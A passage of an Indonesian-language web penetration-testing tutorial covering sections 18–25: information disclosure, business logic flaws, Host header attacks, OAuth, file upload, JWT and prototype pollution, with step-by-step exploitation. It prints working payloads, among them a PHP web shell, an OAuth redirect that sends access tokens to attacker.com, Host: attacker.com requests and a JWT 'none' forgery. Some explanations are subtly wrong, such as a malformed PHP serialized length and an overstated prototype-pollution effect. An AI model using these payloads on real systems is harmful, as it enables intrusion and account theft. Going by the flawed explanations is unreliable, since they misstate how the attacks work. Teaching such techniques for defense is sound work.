- **Testing Payloads:** Kirimkan objek serialized dengan payload berbahaya.

**Cara Eksploitasi:**
- **Remote Code Execution:** Modifikasi data serialized untuk menyisipkan perintah berbahaya.
- **Data Manipulation:** Ubah data serialized untuk memanipulasi logika aplikasi, seperti mengubah hak akses pengguna.

**Contoh Payload (PHP Serialized Object):**
```php
O:4:"User":1:{s:4:"name";s:11:"<script>alert(1)</script>";}
```

**Eksploitasi Detail:**
1. **Menemukan Input Serialized:**
   - Penyerang mencari form atau endpoint yang menerima data serialized, seperti form upload atau API yang menerima JSON/XML.

2. **Menyusun Payload Serialized:**
   - Penyerang membuat objek serialized yang berisi payload berbahaya.
   - **Contoh Payload:**
     ```php
     O:4:"User":1:{s:4:"name";s:11:"<script>alert(1)</script>";}
     ```
   - Di sini, properti `name` diubah untuk menyisipkan skrip XSS.

3. **Mengirimkan Payload ke Aplikasi:**
   - Penyerang mengunggah atau mengirimkan payload serialized ke aplikasi target.

4. **Proses Deserialization:**
   - Aplikasi mendeserialize data tanpa validasi atau sanitasi, menjalankan atau menyimpan payload berbahaya.
   - **Contoh Proses:**
     ```php
     $user = unserialize($_POST['data']);
     echo $user->name;
     ```
   - Jika `$_POST['data']` mengandung payload, skrip berbahaya akan dieksekusi saat ditampilkan.

5. **Dampak:**
   - **Remote Code Execution:** Penyerang bisa menjalankan kode berbahaya di server.
   - **Data Manipulation:** Mengubah data serialized untuk mengubah logika aplikasi, seperti mengubah peran pengguna menjadi admin.
   - **Data Exfiltration:** Mengakses atau mencuri data sensitif melalui manipulasi objek serialized.

---

### **18. Information Disclosure**

**Apa itu?**
Information Disclosure terjadi ketika aplikasi secara tidak sengaja mengungkapkan informasi sensitif seperti stack traces, data pengguna, atau konfigurasi server, yang dapat dimanfaatkan oleh penyerang untuk serangan lebih lanjut.

**Cara Enumerasi:**
- **Error Messages:** Coba input yang salah dan lihat apakah pesan error mengungkapkan detail teknis.
- **Endpoint Testing:** Akses endpoint yang mungkin mengembalikan informasi sensitif.

**Cara Eksploitasi:**
- **Gather Sensitive Data:** Gunakan informasi yang diungkap untuk melanjutkan serangan, seperti mengumpulkan struktur database.
- **Reconnaissance:** Kumpulkan informasi tentang server, teknologi yang digunakan, dan konfigurasi untuk merencanakan serangan lebih lanjut.

**Contoh:**
Pesan error yang mengandung path file:
```
Error: File not found: /var/www/html/config.php on line 42
```

**Eksploitasi Detail:**
1. **Mencoba Input yang Salah:**
   - Penyerang memasukkan data yang salah atau tidak valid di form input, seperti memasukkan karakter ilegal atau parameter yang tidak ada.
   - **Contoh:** Memasukkan ID yang tidak ada di URL `http://example.com/profile?id=9999`.

2. **Menganalisis Pesan Error:**
   - Jika aplikasi menampilkan pesan error yang terlalu detail, penyerang dapat mengidentifikasi struktur direktori server atau informasi teknis lainnya.
   - **Contoh Pesan Error:**
     ```
     Error: File not found: /var/www/html/config.php on line 42
     ```
   - Dari sini, penyerang mengetahui struktur direktori aplikasi dan lokasi file konfigurasi.

3. **Mengakses Endpoint Sensitif:**
   - Penyerang mencoba mengakses endpoint yang mungkin mengembalikan informasi sensitif, seperti `/admin/config`, `/debug`, atau `/server-info`.
   - **Contoh:**
     ```
     http://example.com/admin/config
     ```
   - Jika endpoint ini mengembalikan data konfigurasi atau informasi server, penyerang dapat menggunakannya untuk serangan lebih lanjut.

4. **Dampak:**
   - **Struktur Sistem Terungkap:** Penyerang mengetahui struktur direktori dan file penting di server.
   - **Konfigurasi Sensitif:** Informasi tentang konfigurasi server, seperti kredensial database atau API keys, dapat diakses.
   - **Perencanaan Serangan Lanjutan:** Informasi yang diungkapkan memudahkan penyerang untuk merencanakan serangan lebih lanjut seperti SQL Injection, SSRF, atau Remote Code Execution.

---

### **19. Business Logic Vulnerabilities**

**Apa itu?**
Kerentanan ini terjadi ketika logika bisnis aplikasi tidak diimplementasikan dengan benar, memungkinkan penyerang untuk melakukan tindakan yang tidak diinginkan atau melewati kontrol yang seharusnya ada.

**Cara Enumerasi:**
- **Workflow Testing:** Uji alur bisnis aplikasi untuk menemukan celah, seperti double-spending dalam sistem pembayaran.
- **Edge Cases:** Coba skenario ekstrem atau tidak biasa dalam penggunaan aplikasi.

**Cara Eksploitasi:**
- **Authentication Bypass:** Manipulasi alur bisnis untuk melewati autentikasi atau otorisasi.
- **Abuse Functionalities:** Gunakan fitur aplikasi untuk tujuan yang tidak dimaksudkan, seperti meminta refund berulang kali dalam sistem pembayaran.

**Contoh:**
Menggunakan state machine yang cacat untuk melewati autentikasi:
```
State A -> State B (bypass) -> State C (authenticated)
```

**Eksploitasi Detail:**
1. **Mengidentifikasi Logika Bisnis yang Rentan:**
   - Penyerang menganalisis alur bisnis aplikasi, seperti proses checkout, sistem pembayaran, atau alur registrasi pengguna.
   - Mencari titik di mana kontrol akses tidak diterapkan dengan benar atau logika alur bisa dimanipulasi.

2. **Menggunakan State Machine yang Cacat:**
   - Penyerang memahami bahwa aplikasi menggunakan state machine untuk mengelola alur bisnis.
   - Menemukan celah di mana transisi antar state tidak diatur dengan benar.
   - **Contoh:**
     - **State A:** Pengguna mengisi formulir pembayaran.
     - **State B:** Pengguna melakukan verifikasi pembayaran.
     - **State C:** Pengguna diotentikasi dan transaksi diselesaikan.
   - Penyerang menemukan bahwa transisi dari State A langsung ke State C tanpa melewati State B, memungkinkan mereka menyelesaikan transaksi tanpa verifikasi pembayaran.

3. **Memanipulasi Alur Bisnis:**
   - Penyerang mengirimkan permintaan yang memicu transisi langsung ke State C.
   - **Contoh Payload:**
     ```
     POST /payment HTTP/1.1
     Host: example.com
     Content-Type: application/json

     {
       "state": "authenticated",
       "transaction": "completed"
     }
     ```
   - Permintaan ini mengubah state menjadi authenticated dan menyelesaikan transaksi tanpa melalui proses verifikasi.

4. **Dampak:**
   - **Bypass Autentikasi/Otorisasi:** Penyerang dapat mengakses fungsi atau data yang seharusnya dilindungi, seperti mengakses halaman admin atau mengubah pengaturan sistem.
   - **Double-Spending:** Dalam sistem pembayaran, penyerang dapat melakukan transaksi ganda tanpa membayar dua kali.
   - **Abuse Fitur Aplikasi:** Menggunakan fitur aplikasi untuk tujuan yang tidak diinginkan, seperti meminta refund berulang kali untuk mendapatkan keuntungan finansial.

---

### **20. HTTP Host Header Attacks**

**Apa itu?**
HTTP Host Header Attacks memanipulasi header `Host` dalam permintaan HTTP untuk tujuan seperti cache poisoning, redirecting, atau bypassing akses kontrol.

**Cara Enumerasi:**
- **Header Manipulation:** Uji berbagai nilai header `Host` dan lihat bagaimana server merespons.
- **Check Application Behavior:** Periksa apakah aplikasi menggunakan nilai Host untuk logika penting.

**Cara Eksploitasi:**
- **Cache Poisoning:** Set Host ke domain penyerang untuk menginjeksi konten berbahaya ke cache.
- **Redirecting:** Manipulasi `Host` untuk mengarahkan pengguna ke situs penyerang, bisa digunakan untuk phishing atau serangan lainnya.

**Contoh Payload:**
```http
GET / HTTP/1.1
Host: attacker.com
```

**Eksploitasi Detail:**
1. **Memanipulasi Header Host:**
   - Penyerang mengirimkan permintaan HTTP dengan header `Host` yang diubah ke domain mereka sendiri.
   - **Payload:**
     ```http
     GET / HTTP/1.1
     Host: attacker.com
     ```

2. **Menyusup ke Cache Server:**
   - Jika aplikasi target menggunakan `Host` untuk menentukan konten yang dikirimkan dan mengizinkan caching berdasarkan `Host`, payload ini dapat menginjeksi konten berbahaya ke cache server.
   - **Contoh:**
     - Permintaan dengan `Host: attacker.com` menyisipkan skrip XSS di halaman yang di-cache.
     - Ketika pengguna lain mengakses halaman tersebut melalui `example.com`, mereka menerima konten berbahaya yang ter-cache.

3. **Redirecting Pengguna:**
   - Aplikasi mungkin menggunakan nilai `Host` untuk menentukan URL redirect setelah tindakan tertentu.
   - Penyerang mengubah `Host` menjadi `attacker.com`, sehingga pengguna diarahkan ke situs penyerang setelah melakukan tindakan di aplikasi target.
   - **Contoh Payload:**
     ```http
     GET /login?next=/dashboard HTTP/1.1
     Host: attacker.com
     ```
   - Aplikasi mungkin mengarahkan kembali ke `Host` yang dimanipulasi, mengarahkan pengguna ke situs penyerang.

4. **Dampak:**
   - **Cache Poisoning:** Pengguna menerima konten yang dimanipulasi dari cache, seperti skrip XSS.
   - **Phishing:** Pengguna diarahkan ke situs penyerang yang terlihat seperti situs asli, memungkinkan penyerang mencuri kredensial atau informasi sensitif.
   - **Bypassing Access Control:** Manipulasi `Host` dapat digunakan untuk melewati kontrol akses atau autentikasi yang bergantung pada `Host`.

---

### **21. OAuth Authentication**

**Apa itu?**
OAuth adalah protokol otentikasi yang memungkinkan aplikasi pihak ketiga mengakses sumber daya pengguna tanpa mengungkapkan kredensial mereka. Kerentanan bisa terjadi jika implementasi OAuth tidak aman, seperti tidak memvalidasi redirect URI dengan benar.

**Cara Enumerasi:**
- **Redirect URIs:** Cek apakah aplikasi membatasi redirect URI dengan benar.
- **Token Handling:** Periksa cara aplikasi menyimpan dan mengelola token akses.

**Cara Eksploitasi:**
- **Redirect URI Manipulation:** Arahkan pengguna ke aplikasi penyerang untuk mencuri token akses.
- **Token Hijacking:** Jika token akses tidak diatur dengan benar, penyerang bisa menggunakan token tersebut untuk mengakses data pengguna.

**Contoh Payload:**
```
https://oauthprovider.com/auth?client_id=attacker&redirect_uri=https://attacker.com/callback&response_type=token
```

**Eksploitasi Detail:**
1. **Menyiapkan Aplikasi Penyerang:**
   - Penyerang mendaftar aplikasi mereka sendiri di penyedia OAuth dengan `client_id` dan `redirect_uri` yang menunjuk ke server mereka, misalnya `https://attacker.com/callback`.

2. **Mengalihkan Pengguna ke URL OAuth yang Dimodifikasi:**
   - Penyerang membuat URL otorisasi OAuth yang mengarahkan token akses ke server penyerang.
   - **Payload URL:**
     ```
     https://oauthprovider.com/auth?client_id=attacker&redirect_uri=https://attacker.com/callback&response_type=token
     ```
   - Pengguna diarahkan ke URL ini dan diminta untuk memberikan izin akses.

3. **Mendapatkan Token Akses:**
   - Setelah pengguna memberikan izin, token akses dikirim ke `redirect_uri` yang dimanipulasi, yaitu `https://attacker.com/callback`.
   - Penyerang menerima token akses tersebut di server mereka.

4. **Menggunakan Token Akses:**
   - Penyerang menggunakan token akses yang dicuri untuk mengakses API atau sumber daya pengguna di penyedia OAuth.
   - **Contoh Permintaan API:**
     ```http
     GET /api/userinfo HTTP/1.1
     Host: oauthprovider.com
     Authorization: Bearer [token_akses]
     ```
   - Dengan token ini, penyerang dapat mengakses data pengguna, seperti profil, email, atau informasi sensitif lainnya.

5. **Dampak:**
   - **Data Theft:** Penyerang dapat mengakses dan mencuri data pengguna yang dilindungi oleh token akses.
   - **Privilege Escalation:** Jika token akses memiliki hak istimewa tinggi, penyerang bisa melakukan tindakan yang lebih berbahaya, seperti mengubah pengaturan akun atau mengakses data administrasi.
   - **Identity Impersonation:** Penyerang dapat bertindak atas nama pengguna, melakukan tindakan yang mempengaruhi reputasi atau keamanan pengguna.

---

### **22. File Upload Vulnerabilities**

**Apa itu?**
Kerentanan pada upload file terjadi ketika aplikasi tidak membatasi tipe file yang diunggah atau tidak memeriksa konten file dengan benar, memungkinkan penyerang mengunggah file berbahaya seperti web shell yang bisa dieksekusi di server.

**Cara Enumerasi:**
- **Allowed File Types:** Cek jenis file yang diizinkan untuk diunggah.
- **Filename Testing:** Coba unggah file dengan ekstensi ganda atau skrip, seperti `shell.php.jpg`.

**Cara Eksploitasi:**
- **Web Shell Upload:** Unggah file berbahaya yang bisa dieksekusi di server.
- **Remote Code Execution:** Eksekusi perintah berbahaya pada server melalui web shell yang diunggah.

**Contoh Payload:**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```
Simpan sebagai `shell.php`

**Eksploitasi Detail:**
1. **Mengidentifikasi Form Upload yang Rentan:**
   - Penyerang mencari form upload file di aplikasi, seperti form untuk mengunggah avatar profil atau dokumen.

2. **Menyusun File Berbahaya:**
   - Penyerang membuat file berbahaya, seperti web shell, yang dapat menjalankan perintah sistem.
   - **Contoh Payload:**
     ```php
     <?php echo shell_exec($_GET['cmd']); ?>
     ```
   - Simpan file ini dengan nama yang tampak sah, misalnya `shell.php.jpg`, untuk melewati filter ekstensi file.

3. **Mengunggah File Berbahaya:**
   - Penyerang mengunggah file yang berisi skrip berbahaya ke aplikasi.
   - Jika aplikasi hanya memeriksa ekstensi file tanpa memeriksa MIME type atau konten, file `shell.php.jpg` bisa diterima.

4. **Mengakses dan Menjalankan Web Shell:**
   - Penyerang menemukan URL tempat file diunggah, misalnya `http://example.com/uploads/shell.php.jpg`.
   - Penyerang mengakses URL tersebut dan menjalankan perintah dengan menambahkan parameter `cmd`, seperti:
     ```
     http://example.com/uploads/shell.php.jpg?cmd=ls
     ```
   - Perintah `ls` dijalankan di server, dan hasilnya ditampilkan di browser penyerang.

5. **Dampak:**
   - **Remote Code Execution:** Penyerang dapat menjalankan perintah sistem apa pun di server, termasuk menghapus file, mengubah konfigurasi, atau mengambil data sensitif.
   - **Privilege Escalation:** Jika server berjalan dengan hak istimewa tinggi, penyerang dapat mendapatkan kontrol penuh atas sistem.
   - **Persistence:** Penyerang dapat mengunggah web shell yang disimpan di server untuk akses berkelanjutan.

---

### **23. JSON Web Token (JWT) Vulnerabilities**

**Apa itu?**
JWT digunakan untuk otentikasi dan transfer data. Kerentanan bisa terjadi jika token tidak diverifikasi dengan benar atau menggunakan algoritma lemah, memungkinkan penyerang memodifikasi token untuk mendapatkan hak akses lebih tinggi.

**Cara Enumerasi:**
- **Token Inspection:** Decode token JWT dan periksa payload serta header.
- **Algorithm Testing:** Coba ganti algoritma menjadi `none` atau `HS256` jika server tidak memeriksa dengan benar.

**Cara Eksploitasi:**
- **Token Manipulation:** Ubah payload untuk mendapatkan hak akses lebih tinggi.
- **Signature Bypass:** Jika aplikasi tidak memeriksa signature dengan benar, penyerang bisa mengubah algoritma atau menghilangkan signature untuk membuat token palsu.

**Contoh Payload:**
Header asli:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
Manipulasi menjadi:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Eksploitasi Detail:**
1. **Menginspeksi Token JWT:**
   - Penyerang mendapatkan token JWT, misalnya melalui pencurian cookie atau melalui intercepting request.
   - Menggunakan alat seperti [jwt.io](https://jwt.io/), penyerang mendecode token untuk melihat isi payload dan header.

2. **Memahami Struktur Token:**
   - **Header:** Berisi informasi tentang algoritma yang digunakan untuk signature, seperti `HS256`.
   - **Payload:** Berisi klaim atau data pengguna, seperti `{"user":"admin","role":"user"}`.
   - **Signature:** Berisi tanda tangan yang memastikan token tidak diubah.

3. **Mengubah Payload:**
   - Penyerang mengubah klaim di payload untuk meningkatkan hak akses, misalnya mengubah `role` menjadi `admin`.
   - **Payload Manipulasi:**
     ```json
     {
       "user": "admin",
       "role": "admin"
     }
     ```
   - Encode kembali token dengan payload yang telah diubah.

4. **Mengubah Header untuk Bypass Signature:**
   - Penyerang mengubah header JWT untuk menggunakan algoritma `none`, yang berarti tidak ada signature yang diperlukan.
   - **Payload yang Dimanipulasi:**
     ```json
     {
       "alg": "none",
       "typ": "JWT"
     }
     ```
   - Encode kembali token tanpa signature.

5. **Menggunakan Token Palsu:**
   - Penyerang menggunakan token yang telah dimanipulasi untuk mengakses API atau sumber daya yang seharusnya hanya diakses oleh pengguna dengan hak istimewa tinggi.
   - Aplikasi target mungkin tidak memeriksa signature atau memvalidasi algoritma dengan benar, sehingga menerima token palsu sebagai sah.

6. **Dampak:**
   - **Privilege Escalation:** Penyerang mendapatkan akses admin atau hak istimewa lebih tinggi.
   - **Data Theft:** Penyerang dapat mengakses data sensitif yang seharusnya dilindungi.
   - **Session Hijacking:** Penyerang dapat mengambil alih sesi pengguna lain dengan token yang dimanipulasi.

---

### **24. Essential Skills**

**Apa itu?**
Ini adalah keterampilan dasar yang penting dalam penetration testing, seperti kemampuan scanning, menganalisis, dan menggunakan tools keamanan siber.

**Cara Enumerasi:**
- **Tool Proficiency:** Kuasai alat seperti Nmap, Burp Suite, Metasploit.
- **Knowledge Base:** Pahami konsep dasar keamanan siber dan teknik pengujian penetrasi.

**Cara Eksploitasi:**
- **Comprehensive Testing:** Gunakan keterampilan ini untuk melakukan pengujian menyeluruh dan menemukan berbagai kerentanan.
- **Targeted Scanning:** Lakukan pemindaian yang ditargetkan untuk menemukan kerentanan spesifik berdasarkan hasil enumerasi.

**Contoh Skills:**
- **Scanning dengan Nmap:** Gunakan Nmap untuk memindai port dan mengidentifikasi layanan yang berjalan di server.
- **Intercepting dengan Burp Suite:** Gunakan Burp Suite untuk intercept dan memodifikasi permintaan HTTP, serta menganalisis respons server.

**Penjelasan Detail:**
1. **Kuasai Alat Penting:**
   - **Nmap:** Alat pemindaian jaringan yang digunakan untuk mengidentifikasi host, port terbuka, dan layanan yang berjalan. Contoh penggunaan:
     ```
     nmap -sS -sV -T4 example.com
     ```
     Perintah ini melakukan pemindaian stealth (`-sS`), mendeteksi versi layanan (`-sV`), dan meningkatkan kecepatan pemindaian (`-T4`).

   - **Burp Suite:** Platform pengujian keamanan aplikasi web yang memungkinkan intercepting, modifying, dan replaying permintaan HTTP. Digunakan untuk mendeteksi kerentanan seperti XSS, SQL Injection, dan lainnya.

   - **Metasploit:** Framework eksploitasi yang digunakan untuk mengembangkan dan menjalankan payload terhadap target. Berguna untuk menguji kerentanan dan mengeksploitasi mereka secara otomatis.

2. **Pahami Konsep Dasar Keamanan Siber:**
   - **Serangan dan Kerentanan:** Memahami berbagai jenis serangan (seperti DDoS, phishing) dan bagaimana mereka mengeksploitasi kerentanan.
   - **Mitigasi:** Mengetahui metode untuk melindungi sistem, seperti penggunaan firewall, enkripsi, dan pembaruan perangkat lunak.

3. **Melakukan Pengujian Menyeluruh:**
   - **Step-by-Step Testing:** Memulai dengan pemindaian jaringan untuk mengidentifikasi host dan layanan, kemudian menganalisis aplikasi web untuk kerentanan, dan akhirnya mencoba mengeksploitasi kerentanan yang ditemukan.
   - **Dokumentasi:** Mencatat setiap langkah, temuan, dan tindakan yang diambil selama pengujian untuk laporan akhir.

4. **Pemindaian Terarah:**
   - **Targeted Scanning:** Berdasarkan hasil enumerasi, penyerang fokus pada area tertentu untuk menemukan kerentanan spesifik.
   - **Contoh:** Setelah menemukan port terbuka pada Nmap, gunakan Metasploit untuk mencari modul eksploitasi yang sesuai dengan layanan yang ditemukan.

---

### **25. Prototype Pollution**

**Apa itu?**
Prototype Pollution adalah kerentanan di JavaScript di mana penyerang dapat memodifikasi prototype objek, menyebabkan perubahan perilaku aplikasi dan membuka jalan untuk serangan lainnya seperti bypass autentikasi.

**Cara Enumerasi:**
- **Input Testing:** Coba masukkan parameter seperti `__proto__` atau `constructor` di input yang diteruskan ke objek JavaScript.
- **Code Review:** Lihat bagaimana aplikasi memproses dan menggabungkan objek.

**Cara Eksploitasi:**
- **Modify Behavior:** Ubah properti prototype untuk mengubah logika aplikasi, misalnya, bypass autentikasi.

**Contoh Payload:**
```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

**Eksploitasi Detail:**
1. **Mencari Input yang Rentan:**
   - Penyerang mencari form atau API yang menerima data JSON dan menggabungkannya dengan objek JavaScript, seperti:
     ```javascript
     let user = { name: "John" };
     user = Object.assign(user, req.body);
     ```
   - Jika `req.body` mengandung `__proto__`, penyerang dapat memodifikasi prototype objek `user`.

2. **Mengirimkan Payload:**
   - Penyerang mengirimkan data JSON yang berisi `__proto__` dengan properti yang ingin dimodifikasi.
   - **Payload:**
     ```json
     {
       "__proto__": {
         "isAdmin": true
       }
     }
     ```

3. **Proses Modifikasi Prototype:**
   - Aplikasi menggunakan `Object.assign` atau metode serupa tanpa validasi, sehingga prototype objek `user` diubah.
   - Semua objek yang dibuat setelahnya akan memiliki properti `isAdmin` yang bernilai `true`.

4. **Bypass Autentikasi:**
   - Penyerang dapat membuat objek pengguna baru yang memiliki properti `isAdmin` tanpa perlu otorisasi.
   - **Contoh:**
     ```javascript
     let user = { name: "Egi" };
     console.log(user.isAdmin); // true
     ```
   - Dengan `isAdmin: true`, penyerang bisa mendapatkan akses admin atau fungsi yang hanya diizinkan untuk admin.

5. **Dampak:**
   - **Bypass Autentikasi/Otorisasi:** Penyerang dapat mengakses fitur atau data yang seharusnya dilindungi.
   - **Perubahan Logika Aplikasi:** Mengubah perilaku aplikasi secara global, yang dapat digunakan untuk melakukan serangan lebih lanjut seperti XSS atau CSRF.
   - **Data Manipulation:** Memodifikasi data aplikasi untuk keuntungan penyerang atau menyebabkan kerusakan sistem.

---
